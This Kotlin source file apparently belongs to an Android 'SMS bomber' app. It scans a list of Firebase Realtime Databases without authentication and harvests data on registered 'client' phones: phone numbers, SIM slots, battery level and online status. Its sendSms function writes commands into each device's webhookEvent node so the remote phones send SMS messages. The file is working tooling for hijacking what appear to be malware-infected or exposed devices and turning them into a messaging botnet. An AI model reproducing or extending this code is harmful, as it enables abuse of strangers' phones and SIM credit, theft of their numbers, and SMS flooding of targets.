package com.sanji.bomberpro.services

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Dispatcher
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val firebaseId: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
    val model: String? = null,
    val android: String? = null,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

data class FirebaseTestResult(
    val firebaseId: String,
    val firebaseLabel: String,
    val httpStatus: Int,
    val totalClients: Int,
    val onlineClients: Int,
    val error: String? = null,
)

class RealtimeDbService {

    private val http: OkHttpClient = run {
        val dispatcher = Dispatcher().apply {
            maxRequests = 300
            maxRequestsPerHost = 300
        }
        OkHttpClient.Builder()
            .connectTimeout(4, TimeUnit.SECONDS)
            .readTimeout(6, TimeUnit.SECONDS)
            .writeTimeout(4, TimeUnit.SECONDS)
            .callTimeout(8, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .dispatcher(dispatcher)
            .build()
    }

    private val heavyHttp: OkHttpClient = run {
        val dispatcher = Dispatcher().apply {
            maxRequests = 20
            maxRequestsPerHost = 20
        }
        OkHttpClient.Builder()
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .writeTimeout(8, TimeUnit.SECONDS)
            .callTimeout(30, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .dispatcher(dispatcher)
            .build()
    }

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()
    private val pathCache = ConcurrentHashMap<String, String>()

    companion object {
        private const val TAG = "RealtimeDbService"

        // 10 minutes — user doesn't need to scan again for 10 min after a successful scan
        private const val SCAN_CACHE_MS = 10 * 60 * 1000L

        // Empty scans retry fast — 15s
        private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L

        private const val TOTAL_SCAN_TIMEOUT_MS = 60_000L
        private const val CLIENTS_JSON_TIMEOUT_MS = 5_000L
        private const val FULL_FETCH_TIMEOUT_MS = 25_000L
        private const val FULL_FETCH_MAX_BYTES = 20L * 1024L * 1024L
        private const val GLOBAL_DEVICE_CONCURRENCY = 300
        private const val PER_FIREBASE_CONCURRENCY = 50
        private const val ONLINE_WINDOW_SEC = 600L

        // ============================================================
        //  SHARED CACHE — across all RealtimeDbService instances
        //  Scan in one screen → cached result available in other screens
        // ============================================================
        private val scanCache = ConcurrentHashMap<String, ScanCache>()

        private fun cacheKey(firebases: List<FirebaseNode>): String =
            firebases.joinToString(",") { "${it.id}|${it.url}" }

        private data class ScanCache(
            val devices: List<Device>,
            val ts: Long,
        )
    }

    // ============================================================
    //  FIREBASES
    // ============================================================
    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get().await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                val enabled = doc.getBoolean("enabled") ?: true
                if (!enabled) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = true,
                )
            }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "loadFirebases failed", e)
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ============================================================
    //  TEST SINGLE FIREBASE
    // ============================================================
    suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = "$baseUrl/clients.json?shallow=true"

        val clientIds: List<String>
        try {
            val req = Request.Builder()
                .url(clientsUrl)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            val result = http.newCall(req).execute().use { resp ->
                val body = resp.body?.string()?.trim() ?: ""
                when {
                    !resp.isSuccessful -> Pair(
                        when (resp.code) {
                            401 -> "Auth required (rules block read)"
                            403 -> "Forbidden (rules block access)"
                            404 -> "Not found (wrong URL?)"
                            429 -> "Rate limited"
                            in 500..599 -> "Server error ${resp.code}"
                            else -> "HTTP ${resp.code}"
                        },
                        emptyList<String>(),
                    )
                    body.isEmpty() || body == "null" -> Pair(
                        "Empty — no clients registered",
                        emptyList<String>(),
                    )
                    else -> {
                        val ids = mutableListOf<String>()
                        try {
                            val obj = JSONObject(body)
                            val keys = obj.keys()
                            while (keys.hasNext()) ids.add(keys.next())
                        } catch (_: Exception) {}
                        Pair(null, ids)
                    }
                }
            }
            val err = result.first
            clientIds = result.second
            if (err != null) {
                return@withContext FirebaseTestResult(
                    firebaseId = fb.id,
                    firebaseLabel = fb.label,
                    httpStatus = 0,
                    totalClients = 0,
                    onlineClients = 0,
                    error = err,
                )
            }
        } catch (e: Exception) {
            return@withContext FirebaseTestResult(
                firebaseId = fb.id,
                firebaseLabel = fb.label,
                httpStatus = 0,
                totalClients = 0,
                onlineClients = 0,
                error = "Network: ${e.message ?: e.javaClass.simpleName}",
            )
        }

        val onlineCounter = AtomicInteger(0)
        val sem = Semaphore(50)

        coroutineScope {
            clientIds.map { devId ->
                async(Dispatchers.IO) {
                    try {
                        sem.withPermit {
                            val obj = fetchDeviceObject(fb, devId) ?: return@withPermit
                            if (isOnline(obj)) onlineCounter.incrementAndGet()
                        }
                    } catch (_: Exception) {}
                }
            }.awaitAll()
        }

        val online = onlineCounter.get()
        val total = clientIds.size
        val errMsg: String? = when {
            online > 0 -> null
            total == 0 -> "No clients registered"
            online == 0 -> "$total registered, 0 online (all dead)"
            else -> null
        }

        FirebaseTestResult(
            firebaseId = fb.id,
            firebaseLabel = fb.label,
            httpStatus = 200,
            totalClients = total,
            onlineClients = online,
            error = errMsg,
        )
    }

    // ============================================================
    //  SCAN ALL — shared 10-min cache
    // ============================================================
    suspend fun scanAll(
        firebases: List<FirebaseNode>,
        forceRefresh: Boolean = false,
        onProgress: ((index: Int, devicesFound: Int) -> Unit)? = null,
    ): List<Device> = withContext(Dispatchers.IO) {
        if (firebases.isEmpty()) return@withContext emptyList<Device>()

        val key = cacheKey(firebases)
        val cached = scanCache[key]

        if (!forceRefresh && cached != null) {
            val age = System.currentTimeMillis() - cached.ts
            val maxAge = if (cached.devices.isEmpty()) EMPTY_SCAN_CACHE_MS else SCAN_CACHE_MS
            if (age < maxAge) {
                val ageMin = age / 1000 / 60
                val ageSec = (age / 1000) % 60
                val ageLabel = if (ageMin > 0) "${ageMin}m ${ageSec}s" else "${ageSec}s"
                Log.d(TAG, "scanAll: CACHE HIT — ${cached.devices.size} devices, age=$ageLabel (max=${maxAge / 1000 / 60}m)")
                onProgress?.invoke(firebases.size - 1, cached.devices.size)
                return@withContext cached.devices
            } else {
                Log.d(TAG, "scanAll: cache EXPIRED (age=${age / 1000}s, max=${maxAge / 1000}s) — rescanning")
            }
        } else if (forceRefresh) {
            Log.d(TAG, "scanAll: forceRefresh=true — bypassing cache")
        }

        Log.d(TAG, "scanAll: fresh scan of ${firebases.size} firebase(s)")

        val allFound = java.util.Collections.synchronizedList(mutableListOf<Device>())
        val globalSem = Semaphore(GLOBAL_DEVICE_CONCURRENCY)
        var completed = false

        withTimeoutOrNull(TOTAL_SCAN_TIMEOUT_MS) {
            coroutineScope {
                firebases.mapIndexed { idx, fb ->
                    async(Dispatchers.IO) {
                        try {
                            scanFirebase(
                                fb = fb,
                                globalSem = globalSem,
                                onDevice = { dev ->
                                    allFound.add(dev)
                                    onProgress?.invoke(idx, allFound.size)
                                },
                            )
                        } catch (e: CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
                        }
                    }
                }.awaitAll()
            }
            completed = true
        } ?: Log.w(TAG, "scanAll timeout — preserving ${allFound.size} partial device(s)")

        val final = allFound.toList()
        Log.d(TAG, "scanAll done: ${final.size} device(s) (completed=$completed) — cached for 10 min")

        if (completed) {
            scanCache[key] = ScanCache(final, System.currentTimeMillis())
        }

        final
    }

    // ============================================================
    //  SCAN SINGLE FIREBASE
    // ============================================================
    private suspend fun scanFirebase(
        fb: FirebaseNode,
        globalSem: Semaphore,
        onDevice: (Device) -> Unit,
    ): Unit = coroutineScope {
        val fullResult = scanFirebaseFull(fb)
        if (fullResult != null) {
            Log.d(TAG, "scan ${fb.label}: full fetch yielded ${fullResult.size} device(s)")
            fullResult.forEach(onDevice)
            return@coroutineScope
        }

        Log.d(TAG, "scan ${fb.label}: full fetch failed — falling back to per-device")

        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS

        val bodyText: String? = try {
            withTimeoutOrNull(CLIENTS_JSON_TIMEOUT_MS) {
                val req = Request.Builder()
                    .url(clientsUrl)
                    .header("Accept", "application/json")
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                    .get().build()
                http.newCall(req).execute().use { resp ->
                    if (!resp.isSuccessful) null else resp.body?.string()?.trim()
                }
            }
        } catch (e: CancellationException) { throw e }
        catch (_: Exception) { null }

        if (bodyText.isNullOrEmpty() || bodyText == "null") return@coroutineScope

        val deviceIds: List<String> = try {
            val obj = JSONObject(bodyText)
            val list = mutableListOf<String>()
            val keys = obj.keys()
            while (keys.hasNext()) list.add(keys.next())
            list
        } catch (_: Exception) { return@coroutineScope }

        if (deviceIds.isEmpty()) return@coroutineScope

        Log.d(TAG, "scan ${fb.label}: ${deviceIds.size} client(s) to fetch individually")

        val perFbSem = Semaphore(PER_FIREBASE_CONCURRENCY)
        deviceIds.map { devId ->
            async(Dispatchers.IO) {
                try {
                    perFbSem.withPermit {
                        globalSem.withPermit {
                            val dev = fetchDevice(fb, devId)
                            if (dev != null) onDevice(dev)
                        }
                    }
                } catch (e: CancellationException) { throw e }
                catch (_: Exception) {}
            }
        }.awaitAll()
    }

    private suspend fun scanFirebaseFull(fb: FirebaseNode): List<Device>? {
        val url = fb.url.trimEnd('/') + "/clients.json"
        return try {
            withTimeoutOrNull(FULL_FETCH_TIMEOUT_MS) {
                val req = Request.Builder()
                    .url(url)
                    .header("Accept", "application/json")
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                    .get().build()
                heavyHttp.newCall(req).execute().use { resp ->
                    if (!resp.isSuccessful) {
                        Log.w(TAG, "full fetch ${fb.label}: HTTP ${resp.code}")
                        return@withTimeoutOrNull null
                    }
                    val contentLength = resp.body?.contentLength() ?: -1L
                    if (contentLength > FULL_FETCH_MAX_BYTES) {
                        Log.w(TAG, "full fetch ${fb.label}: response too large (${contentLength / 1024 / 1024}MB)")
                        return@withTimeoutOrNull null
                    }
                    val body = resp.body?.string() ?: return@withTimeoutOrNull null
                    val trimmed = body.trim()
                    if (trimmed.isEmpty() || trimmed == "null") return@withTimeoutOrNull emptyList()

                    val root = try { JSONObject(trimmed) } catch (_: Exception) {
                        return@withTimeoutOrNull null
                    }

                    val devices = mutableListOf<Device>()
                    val keys = root.keys()
                    while (keys.hasNext()) {
                        val devId = keys.next()
                        val devObj = root.optJSONObject(devId) ?: continue
                        val dev = parseDeviceFromObject(fb, devId, devObj)
                        if (dev != null) devices.add(dev)
                    }
                    devices
                }
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "full fetch ${fb.label} failed: ${e.message}")
            null
        }
    }

    private fun parseDeviceFromObject(fb: FirebaseNode, devId: String, obj: JSONObject): Device? {
        val hasUsableData = obj.has("deviceName") || obj.has("name") ||
                obj.has("phoneNumber") || obj.has("phone") ||
                obj.has("number") || obj.has("msisdn") ||
                obj.has("sims") || obj.has("sim")
        if (!hasUsableData) return null

        val online = isOnline(obj)
        if (!online) {
            val name = obj.optString("deviceName", obj.optString("name", ""))
            val phone = obj.optString("phoneNumber", obj.optString("phone", ""))
            val hasSims = obj.has("sims") || obj.has("sim")
            if (name.isBlank() && phone.isBlank() && !hasSims) return null
        }

        return Device(
            firebaseUrl = fb.url,
            firebaseLabel = fb.label,
            firebaseId = fb.id,
            deviceId = devId,
            deviceName = extractDeviceName(obj),
            phone = extractPhone(obj),
            battery = extractBattery(obj),
            sims = parseSims(obj),
            shortId = shortCode(devId),
            lastSeen = extractLastSeen(obj),
            model = obj.optString("model", obj.optString("deviceModel", null)),
            android = obj.optString("androidVersion", obj.optString("sdk", null)),
        )
    }

    private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
        return try {
            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
            val req = Request.Builder()
                .url(url)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string()?.trim() ?: return null
                if (body.isEmpty() || body == "null") return null
                try { JSONObject(body) } catch (_: Exception) { null }
            }
        } catch (_: Exception) { null }
    }

    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
        val obj = fetchDeviceObject(fb, devId) ?: return null
        return parseDeviceFromObject(fb, devId, obj)
    }

    private fun isOnline(obj: JSONObject): Boolean {
        for (key in listOf("isOnline", "online", "connected", "active", "enabled")) {
            val v = obj.opt(key) ?: continue
            if (v is Boolean && v) return true
            if (v is Number && v.toInt() == 1) return true
            if (v is String) {
                val s = v.lowercase()
                if (s == "true" || s == "yes" || s == "1" || s == "online" || s == "active") return true
            }
        }

        val st = obj.opt("status")
        if (st is Boolean && st) return true
        if (st is String) {
            val s = st.lowercase()
            if (s == "online" || s == "active" || s == "connected" || s == "1") return true
        }

        val lastSeenKeys = listOf(
            "lastSeen", "last_seen", "lastOnline", "lastPing",
            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
        )
        for (k in lastSeenKeys) {
            if (!obj.has(k) || obj.isNull(k)) continue
            try {
                var iv = when (val v = obj.opt(k)) {
                    is Number -> v.toLong()
                    is String -> v.toLongOrNull() ?: 0L
                    else -> 0L
                }
                if (iv > 10_000_000_000L) iv /= 1000L
                if (iv > 0 && System.currentTimeMillis() / 1000L - iv < ONLINE_WINDOW_SEC) {
                    return true
                }
            } catch (_: Exception) {}
        }

        return false
    }

    private fun extractDeviceName(obj: JSONObject): String {
        for (k in listOf("deviceName", "name", "model", "device", "brand")) {
            val v = obj.optString(k, "")
            if (v.isNotBlank()) return v.take(64)
        }
        return "device"
    }

    private fun extractPhone(obj: JSONObject): String? {
        val keys = listOf("phoneNumber", "phone", "number", "msisdn", "simNumber", "phone_number", "PhoneNumber", "Phone")
        for (k in keys) {
            val v = obj.optString(k, "")
            if (v.isNotBlank() && v.length >= 7) return v
        }
        val simsArr = obj.optJSONArray("sims") ?: obj.optJSONArray("sim")
        if (simsArr != null) {
            for (i in 0 until simsArr.length()) {
                val s = simsArr.optJSONObject(i) ?: continue
                for (k in keys) {
                    val v = s.optString(k, "")
                    if (v.isNotBlank() && v.length >= 7) return v
                }
            }
        }
        val dev = obj.optJSONObject("device") ?: obj.optJSONObject("deviceInfo")
        if (dev != null) {
            for (k in keys) {
                val v = dev.optString(k, "")
                if (v.isNotBlank() && v.length >= 7) return v
            }
        }
        return null
    }

    private fun extractBattery(obj: JSONObject): Int? {
        for (k in listOf("battery", "batteryLevel", "batteryPercentage")) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    val v = obj.optInt(k, -1)
                    if (v in 0..100) return v
                } catch (_: Exception) {}
            }
        }
        return null
    }

    private fun extractLastSeen(obj: JSONObject): Long {
        for (k in listOf(
            "lastSeen", "last_seen", "lastOnline", "lastPing",
            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
        )) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    var iv = obj.optLong(k, 0L)
                    if (iv > 10_000_000_000L) iv /= 1000L
                    if (iv > 0) return iv
                } catch (_: Exception) {}
            }
        }
        return 0L
    }

    private fun parseSims(obj: JSONObject): List<Map<String, Any?>> {
        val sims = obj.optJSONArray("sims") ?: obj.optJSONArray("sim") ?: return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        for (i in 0 until sims.length()) {
            val s = sims.optJSONObject(i) ?: continue
            out.add(
                mapOf(
                    "simSlotIndex" to s.optInt("simSlotIndex", s.optInt("slot", 0)),
                    "phoneNumber" to s.optString("phoneNumber", null),
                )
            )
        }
        return out
    }

    private fun shortCode(devId: String): String {
        return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
    }

    suspend fun sendSms(
        firebaseUrl: String,
        deviceId: String,
        simSlot: Int,
        to: String,
        message: String,
    ): SendResult = withContext(Dispatchers.IO) {
        val ts = System.currentTimeMillis() / 1000L
        val toEscaped = escapeJson(to)
        val msgEscaped = escapeJson(message)

        val attempts = listOf(
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":$simSlot,"to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":"$simSlot","to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/messages.json",
                """{"phone":$toEscaped,"text":$msgEscaped,"sim":$simSlot,"timestamp":$ts}"""
            ),
        )

        for ((path, body) in attempts) {
            try {
                val url = firebaseUrl.trimEnd('/') + path
                val req = Request.Builder()
                    .url(url)
                    .header("Accept", "application/json")
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                    .put(body.toRequestBody(jsonMedia))
                    .build()
                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        return@withContext SendResult(true, deviceId, firebaseUrl)
                    }
                }
            } catch (e: CancellationException) { throw e }
            catch (_: Exception) {}
        }
        SendResult(false, deviceId, firebaseUrl, "all attempts failed")
    }

    fun getCachedPath(fbId: String, devId: String): String? = pathCache["$fbId:$devId"]
    fun setCachedPath(fbId: String, devId: String, path: String) { pathCache["$fbId:$devId"] = path }
    fun clearPathCache(fbId: String, devId: String) { pathCache.remove("$fbId:$devId") }

    fun invalidateScanCache() { scanCache.clear() }

    private fun escapeJson(s: String): String = JSONObject.quote(s)
}